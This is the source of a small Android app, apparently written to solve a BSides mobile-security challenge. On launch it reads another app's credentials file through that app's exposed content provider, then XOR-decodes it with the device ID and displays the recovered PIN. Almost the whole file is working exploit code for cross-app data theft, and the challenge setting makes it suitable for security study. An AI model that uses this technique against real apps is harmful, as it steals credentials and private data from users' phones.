package hu.vsza.bsides.malware;

import android.app.Activity;
import android.os.Bundle;
import android.util.Log;
import android.util.Base64;
import android.net.Uri;
import android.telephony.TelephonyManager;
import android.widget.TextView;
import java.io.*;

public class Main extends Activity
{
    public final static String TAG = "VSzAMalware";

    /** Called when the activity is first created. */
    @Override
    public void onCreate(Bundle savedInstanceState)
    {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);

        try {
            InputStream istr = getContentResolver().openInputStream(Uri.parse(
                        "content://com.mwri.fileEncryptor.localfile" +
                        "/data/data/com.example.bsidechallenge/files/creds.txt"));
            Log.i(TAG, "Available: " + istr.available());
            InputStreamReader isr = new InputStreamReader(istr);
            BufferedReader br = new BufferedReader(isr);
            String creds = br.readLine();
            Log.i(TAG, "Contents: " + creds);

            TelephonyManager tm = (TelephonyManager)getSystemService("phone");
            String did = tm.getDeviceId();
            Log.i(TAG, "DeviceId: " + did);

            byte[] result = xor(did.getBytes(), Base64.decode(creds, Base64.DEFAULT));
            String pin = new String(result).substring(0, 4);

            Log.i(TAG, "PIN: " + pin);
            TextView tv = (TextView)findViewById(R.id.pin);
            tv.setText(pin);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // Copy-pasted from JD-GUI output
    private static byte[] xor(byte[] paramArrayOfByte1, byte[] paramArrayOfByte2)
    {
        byte[] arrayOfByte = new byte[paramArrayOfByte1.length];
        int i = 0;
        while (true)
        {
            int j = paramArrayOfByte1.length;
            if (i >= j)
                return arrayOfByte;
            int k = paramArrayOfByte1[i];
            int m = paramArrayOfByte2.length;
            int n = i % m;
            int i1 = paramArrayOfByte2[n];
            int i2 = (byte)(k ^ i1);
            arrayOfByte[i] = (byte)i2;
            i += 1;
        }
    }
}
